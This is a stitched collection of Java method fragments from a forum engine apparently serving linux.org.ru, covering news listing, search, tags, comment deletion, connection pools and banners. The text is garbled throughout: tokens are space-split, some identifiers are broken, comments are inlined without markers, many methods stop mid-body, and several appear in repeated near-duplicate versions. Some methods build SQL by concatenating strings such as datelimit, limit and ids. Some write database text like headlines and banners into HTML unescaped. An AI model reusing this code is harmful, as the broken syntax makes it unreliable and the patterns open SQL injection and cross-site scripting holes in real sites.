toString ( ) + " " + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public void copyScreenshot ( Template tmpl , String sessionId ) throws IOException , UtilException , InterruptedException { String mainname = sessionId + " . " + extension ; String iconname = sessionId + " -icon " + " . " + extension ; mainFile = new File ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery/preview " , mainname ) ; iconFile = new File ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery/preview " , iconname ) ; file . renameTo ( mainFile ) ; boolean error = true ; try { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) ) ; 
public static String detectImageType ( String filename ) throws BadImageException , IOException { File file = new File ( filename ) ; logger . fine ( " Detecting image type for: " + filename + " ( " + file . length ( ) + " bytes) " ) ; ImageInfo2 ii = new ImageInfo2 ( ) ; FileInputStream is = null ; try { is = new FileInputStream ( filename ) ; 
public static void resizeImage ( String filename , String iconname ) throws IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , " 150 " , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { throw new UtilException ( " Can't convert image: convert failed " ) ; 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " + user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
private String printResults ( Connection db , ResultSet rs ) throws SQLException , UserNotFoundException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String title = rs . getString ( " title " ) ; int topic = rs . getInt ( " topic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; int userid = rs . getInt ( " userid " ) ; User user = User . getUserCached ( db , userid ) ; String url ; if ( topic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + topic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( title ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p><p> " ) ; out . append ( user . getSignature ( false , postdate ) ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { return " search?q= " + URLEncoder . encode ( query ) + " &include= " + include + " &date= " + date + " &section= " + section + " &sort= " + sort + " &username= " + URLEncoder . encode ( username ) ; } 
String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException ; String getVariantID ( ProfileHashtable prof ) throws UtilException ; java . util . Date getExpire ( ) ; } 
public static String getViewer ( Viewer viewer , Template tmpl , boolean nocache , boolean closeConnection ) throws UtilException , SQLException , IOException , UserErrorException { return new ViewerCacher ( ) . get ( viewer , tmpl , nocache , closeConnection ) ; } 
public String get ( Viewer viewer , Template tmpl , boolean nocache , boolean closeConnection ) throws UtilException , SQLException , IOException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( tmpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { time = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { try { long current = new Date ( ) . getTime ( ) ; Connection db = tmpl . getConnection ( " viewer-cacher " ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( closeConnection ) { tmpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
private String deleteReplys ( int msgid , User user , boolean score , int depth ) throws SQLException { List < Integer > replys = new ArrayList < Integer > ( ) ; StringBuffer out = new StringBuffer ( ) ; st3 . setInt ( 1 , msgid ) ; ResultSet rs = st3 . executeQuery ( ) ; while ( rs . next ( ) ) { int r = rs . getInt ( " id " ) ; replys . add ( r ) ; } rs . close ( ) ; for ( Integer r : replys ) { out . append ( deleteReplys ( r , user , score , depth + 1 ) ) ; out . append ( " " ) . append ( r ) . append ( " <br> " ) ; switch ( depth ) { case 0 : if ( score ) { deleteComment ( r , " 7.1 (, 0) " , user , - 2 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; case 1 : if ( score ) { deleteComment ( r , " 7.1 (, 1) " , user , - 1 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; default : deleteComment ( r , " 7.1 (, >1) " , user , 0 ) ; break ; } } return out . toString ( ) ; } 
public static String showComments ( Connection db , String nick ) throws SQLException { treturn showComments ( db , nick , 0 , 0 ) ; } 
public static String showComments ( Connection db , String nick , int offset , int limit ) throws SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; try { if ( limit < 1 | | offset < 0 ) { tpst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; } else { tpst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; } pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . toString ( ) ; } 
public synchronized Connection getConnection ( String user ) throws SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnection ( config ) ; logger.notice("config", "opened connection for '"+user+"'"); long endMillis = new Date().getTime(); dbWaitTime = endMillis - startMillis; } return db; } 
private synchronized void initDataSource ( Properties config ) { if ( dataSource ! = null ) return ; dataSource = new MyDataSource ( ) ; dataSource . setDataSourceName ( " Main pool " ) ; dataSource . setServerName ( " localhost " ) ; dataSource . setDatabaseName ( " linux " ) ; dataSource . setUser ( config . getProperty ( " JDBC_USER " ) ) ; dataSource . setPassword ( config . getProperty ( " JDBC_PASS " ) ) ; dataSource . setMaxConnections ( 10 ) ; dataSource . setInitialConnections ( 10 ) ; } 
private synchronized void initDataSourceWhois ( Properties config ) { if ( dataSourceWhois ! = null ) return ; dataSourceWhois = new MyDataSource ( ) ; dataSourceWhois . setDataSourceName ( " Whois pool " ) ; dataSourceWhois . setServerName ( " localhost " ) ; dataSourceWhois . setDatabaseName ( " linux " ) ; dataSourceWhois . setUser ( config . getProperty ( " JDBC_USER " ) ) ; dataSourceWhois . setPassword ( config . getProperty ( " JDBC_PASS " ) ) ; dataSourceWhois . setMaxConnections ( 4 ) ; dataSourceWhois . setInitialConnections ( 4 ) ; } 
public Connection getConnection ( Properties config ) throws SQLException { initDataSource ( config ) ; Connection db ; boolean usePool = " TRUE " . equals ( config . getProperty ( " DB_POOL " ) ) ; boolean useJNDI = " JNDI " . equals ( config . getProperty ( " DB_POOL " ) ) ; if ( useJNDI ) { try { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor " ) ; if ( ds = = null ) { throw new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { throw new RuntimeException ( ex ) ; } } else if ( usePool ) { db = dataSource . getConnection ( ) ; } else { db = DriverManager . getConnection ( config . getProperty ( " JDBC_URL " ) , config . getProperty ( " JDBC_USER " ) , config . getProperty ( " JDBC_PASS " ) ) ; } return db ; } 
public Connection getConnectionWhois ( Properties config ) throws SQLException { initDataSourceWhois ( config ) ; Connection db ; boolean usePool = " TRUE " . equals ( config . getProperty ( " DB_POOL " ) ) ; boolean useJNDI = " JNDI " . equals ( config . getProperty ( " DB_POOL " ) ) ; if ( useJNDI ) { try { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor-whois " ) ; if ( ds = = null ) { throw new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor-whois) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { throw new RuntimeException ( ex ) ; } } else if ( usePool ) db = dataSourceWhois . getConnection ( ) ; else db = DriverManager . getConnection ( config . getProperty ( " JDBC_URL " ) , config . getProperty ( " JDBC_USER " ) , config . getProperty ( " JDBC_PASS " ) ) ; return db ; } 
public void updateMessageText ( Connection db , String text ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; pst . setString ( 1 , text ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; } 
public void init ( FilterConfig filterConfig ) { objFilterConfig = filterConfig ; } 
public void doFilter ( ServletRequest req , ServletResponse res , FilterChain filterChain ) throws IOException , ServletException { if ( isDebugEnabled ) logger . info ( " Doing Filter Cache " ) ; HttpServletResponse response = ( HttpServletResponse ) res ; set the provided HTTP response parameters Enumeration enu = objFilterConfig.getInitParameterNames(); while ( enu.hasMoreElements() ) { String headerName = (String) enu.nextElement(); response.setHeader(headerName,objFilterConfig.getInitParameter(headerName)); RG : use addHeader not setHeader so multiple headers can be added... if (isDebugEnabled) logger.info("Setting Header : " + objFilterConfig.getInitParameter(headerName)); response.addHeader(headerName, objFilterConfig.getInitParameter(headerName)); } pass the request/response on to the rest of the filters filterChain.doFilter(req, response); } 
public String toString ( ) { return VERSION_STRING ; } 
public void destroy ( ) { if ( isDebugEnabled ) logger . info ( " Destroy Cache Filter " ) ; objFilterConfig = null ; } 
private String printResults ( Connection db , ResultSet rs ) throws SQLException , UserNotFoundException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String title = rs . getString ( " title " ) ; int topic = rs . getInt ( " topic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; int userid = rs . getInt ( " userid " ) ; User user = User . getUserCached ( db , userid ) ; String url ; if ( topic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + topic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( title ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <div class=sign> " ) ; out . append ( user . getSignature ( false , postdate ) ) ; out . append ( " </div> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { try { return " search?q= " + URLEncoder . encode ( query , " koi8-r " ) + " &include= " + include + " &date= " + date + " &section= " + section + " &sort= " + sort + " &username= " + URLEncoder . encode ( username ) ; 
public synchronized Connection getConnection ( String user ) throws SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnection ( ) ; logger.notice("config", "opened connection for '"+user+"'"); long endMillis = new Date().getTime(); dbWaitTime = endMillis - startMillis; } return db; } 
public synchronized Connection getConnectionWhois ( ) throws SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnectionWhois ( ) ; long endMillis = new Date ( ) . getTime ( ) ; dbWaitTime = endMillis - startMillis ; } return db ; } 
public Connection getConnection ( ) throws SQLException { Connection db ; try { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor " ) ; if ( ds = = null ) { throw new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { throw new RuntimeException ( ex ) ; } return db ; } 
public Connection getConnectionWhois ( ) throws SQLException { Connection db ; try { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor-whois " ) ; if ( ds = = null ) { throw new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor-whois) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { throw new RuntimeException ( ex ) ; } return db ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
private String printResults ( Connection db , ResultSet rs ) throws SQLException , UserNotFoundException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String title = rs . getString ( " title " ) ; int topic = rs . getInt ( " topic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; int userid = rs . getInt ( " userid " ) ; User user = User . getUserCached ( db , userid ) ; String url ; if ( topic = = 0 ) { url = " view-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + topic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( title ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <div class=sign> " ) ; out . append ( user . getSignature ( false , postdate ) ) ; out . append ( " </div> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . toString ( ) ; } 
public boolean containsLink ( ) { return havelink ; } 
public Connection getConnection ( String user ) throws SQLException { return config . getConnection ( user ) ; } 
public String getBanner ( ) throws SQLException { Connection db = config . getConnection ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id, banner FROM banners WHERE today>0 AND total>0 ORDER BY total DESC LIMIT 1 " ) ; if ( ! rs . next ( ) ) { return " " ; } String banner = rs . getString ( " banner " ) ; int id = rs . getInt ( " id " ) ; rs . close ( ) ; st . executeUpdate ( " UPDATE banners SET total=total-1,today=today-1 WHERE id= " + id ) ; return ( " <a href= \" /forward.jsp?id= " + id + " \" ><img src= \" " + banner + " \" width= " + width + " height= " + height + " alt=adv border=0></a> " ) ; } 
public synchronized Connection getConnection ( ) throws SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnection ( ) ; logger.notice("config", "opened connection for '"+user+"'"); long endMillis = new Date().getTime(); dbWaitTime = endMillis - startMillis; } return db; } 
public Connection getConnection ( ) throws SQLException { return config . getConnection ( ) ; } 
public String get ( Viewer viewer , Template tmpl , boolean nocache , boolean closeConnection ) throws UtilException , SQLException , IOException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( tmpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { time = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { try { long current = new Date ( ) . getTime ( ) ; Connection db = tmpl . getConnection ( ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( closeConnection ) { tmpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException , BadDateException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) throws SQLException , UtilException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException , UtilException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( ) ; 
Connection getConnection ( ) throws SQLException ; void SQLclose ( ) throws SQLException ; } 
public static String URLEncoder ( String str ) { try { StringBuffer buf = new StringBuffer ( ) ; 
private String formatHTMLLine ( String chunk ) throws UtilException { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; out.append("<a href=\"" + URLEncoder(url) + "\">" + urlchunk + "</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static String showComments ( Connection db , String nick ) throws SQLException { return showComments ( db , nick , 0 , 0 ) ; } 
public void addNick ( Connection db , String nick ) throws SQLException , UserNotFoundException , AccessViolationException { User user = User . getUser ( db , nick ) ; int id = user . getId ( ) ; if ( user . canModerate ( ) ) { throw new AccessViolationException ( " " ) ; 
public String deleteAllComments ( Connection db , User moderator ) throws SQLException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; try { Delete user topics PreparedStatement lock = db.prepareStatement("SELECT id FROM topics WHERE userid=? AND not deleted FOR UPDATE"); PreparedStatement st1 = db.prepareStatement("UPDATE topics SET deleted='t',sticky='f' WHERE id=?"); PreparedStatement st2 = db.prepareStatement("INSERT INTO del_info (msgid, delby, reason) values(?,?,?)"); lock.setInt(1, id); st2.setInt(2,moderator.getId()); st2.setString(3,": "); ResultSet lockResult = lock.executeQuery(); lock another delete on this row while (lockResult.next()) { int mid = lockResult.getInt("id"); st1.setInt(1,mid); st2.setInt(1,mid); st1.executeUpdate(); st2.executeUpdate(); } st1.close(); st2.close(); lockResult.close(); lock.close(); Delete user comments deleter = new CommentDeleter(db); st = db.createStatement(); rs = st.executeQuery("SELECT id FROM comments WHERE userid="+id+" AND not deleted ORDER BY id DESC FOR update"); while(rs.next()) { int msgid = rs.getInt("id"); out.append(" #").append(msgid).append("<br>"); out.append(deleter.deleteReplys(msgid, moderator, true)); out.append(deleter.deleteComment(msgid, "4.7 Flood (auto)", moderator, -20)); out.append("<br>"); } } finally { if (deleter!=null) { deleter.close(); } if (rs!=null) { rs.close(); } if (st!=null) { st.close(); } } return out.toString(); } 
private String formatHTMLLine ( String chunk ) throws UtilException { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL String url = chunk.substring(found.getStartIndex(), found.getEndIndex()); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, found.getStartIndex()); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"").append(URLEncoder(url)).append("\">").append(urlchunk).append("</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static String wrapLongLine ( String line , int maxlength , String delim , int start ) { StringBuffer sb = new StringBuffer ( ) ; int index = start ; for ( Iterator i = new SGMLStringIterator ( line ) ; i . hasNext ( ) ; ) { String ch = ( String ) i . next ( ) ; if ( index % maxlength = = maxlength - 1 ) { sb . append ( delim ) ; } sb . append ( ch ) ; index + + ; } return sb . toString ( ) ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( tag ! = null & & ! " " . equals ( tag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? " ) ; pst . setString ( 1 , tag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int tagid = rs . getInt ( " id " ) ; if ( tagid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( tagid ) . append ( " ) " ) ; } } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . toString ( ) + " " + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " topics= " + prof . getInt ( " topics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) + " &tag= " + tag ) ; if ( viewAll ) { id . append ( " &view-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &section= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &group= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &datelimit= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &limit= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . toString ( ) ; } 
private static synchronized int getOrCreateTag ( Connection con , String tag ) throws SQLException { PreparedStatement st2 = con . prepareStatement ( " SELECT id FROM tags_values WHERE value=? " ) ; st2 . setString ( 1 , tag ) ; ResultSet rs = st2 . executeQuery ( ) ; int id ; if ( rs . next ( ) ) { id = rs . getInt ( " id " ) ; } else { PreparedStatement st = con . prepareStatement ( " INSERT INTO tags_values (value) VALUES(?) " ) ; st . setString ( 1 , tag ) ; st . executeUpdate ( ) ; st . close ( ) ; rs = st2 . executeQuery ( ) ; rs . next ( ) ; id = rs . getInt ( " id " ) ; } rs . close ( ) ; st2 . close ( ) ; return id ; } 
public String toString ( ) { String str = " " ; if ( tags = = null | | tags . isEmpty ( ) ) { return " " ; } for ( String tag : tags ) { str + = ( str . length ( ) > 0 ? " , " : " " ) + tag ; } return str ; } 
public static Map < Integer , String > getCloud ( Connection con ) throws SQLException { Map < Integer , String > cloud = new HashMap < Integer , String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values ORDER BY counter DESC LIMIT 10 " ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { cloud . put ( rs . getInt ( " counter " ) , rs . getString ( " value " ) ) ; } return cloud ; } 
public static ArrayList < String > getMessageTags ( Connection con , int msgid ) throws SQLException { return new Tags ( con , msgid ) . getTags ( ) ; } 
public static void checkTag ( String tag ) throws UserErrorException { : , , , <> if (!tagRE.isMatch(tag)) { throw new UserErrorException("Invalid tag: '"+tag+"'"); 
public static void updateTags ( Connection con , int msgid , String tags , boolean moderate ) throws SQLException , UserErrorException { Set < String > tagSet = new HashSet < String > ( ) ; tags = tags.replaceAll("\\|",","); String [] tagsArr = tags.split(","); if (tagsArr.length==0) { return; } for (int i = 0; i < tagsArr.length; i++) { String tag = StringUtils.stripToNull(tagsArr[i].toLowerCase()); - if (tag==null) { continue; } : , , , <> checkTag(tag); tagSet.add(tag); } PreparedStatement st1 = con.prepareStatement("SELECT tagid FROM tags WHERE msgid=? AND tagid=?"); PreparedStatement st2 = con.prepareStatement("INSERT INTO tags VALUES(?,?)"); PreparedStatement st3 = con.prepareStatement("UPDATE tags_values SET counter=counter+1 WHERE id=?"); st1.setInt(1, msgid); st2.setInt(1, msgid); for (String tag : tagSet) { tags_values / id int id = getOrCreateTag(con, tag); tags ? st1.setInt(2,id); ResultSet rs = st1.executeQuery(); if (!rs.next()) { - st2.setInt(2,id); st2.executeUpdate(); } rs.close(); ? if (moderate) { st3.setInt(1,id); st3.executeUpdate(); } } st3.close(); st2.close(); st1.close(); } 
public static String getPlainTags ( Connection con , int msgid ) throws SQLException { return new Tags ( con , msgid ) . toString ( ) ; } 
public static String getTagLinks ( Connection con , int msgid ) throws SQLException { StringBuilder buf = new StringBuilder ( ) ; Tags tags = new Tags ( con , msgid ) ; ArrayList < String > mtags = tags . getTags ( ) ; if ( mtags . isEmpty ( ) ) { return " " ; } for ( String mtag : mtags ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } else { buf . append ( " [: " ) ; } try { buf . append ( " <a href= \" view-news.jsp?section=1&amp;tag= " ) . append ( URLEncoder . encode ( mtag , " UTF-8 " ) ) . append ( " \" > " ) . append ( mtag ) . append ( " </a> " ) ; } catch ( UnsupportedEncodingException e ) { throw new RuntimeException ( e ) ; } } if ( buf . length ( ) > 0 ) { buf . append ( " ] " ) ; } return buf . toString ( ) ; } 
